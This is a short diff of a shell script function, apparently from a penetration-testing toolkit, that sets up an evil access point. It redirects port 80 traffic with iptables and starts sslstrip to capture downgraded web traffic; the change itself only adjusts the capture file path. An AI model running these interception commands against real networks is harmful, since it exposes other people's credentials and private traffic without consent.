@@ -138,8 +138,9 @@ f_evilap(){
   
   echo "Redirecting port 80 to 1000 SSLStrip interception"
   iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+
   echo "Running sslstrip..."
-  sslstrip -a -w /opt/pwnpad/catpures/$sslstripfilename &
+  sslstrip -a --write=/opt/pwnpad/catpures/sslstrip/$sslstripfilename &
 }
 
 #########################################
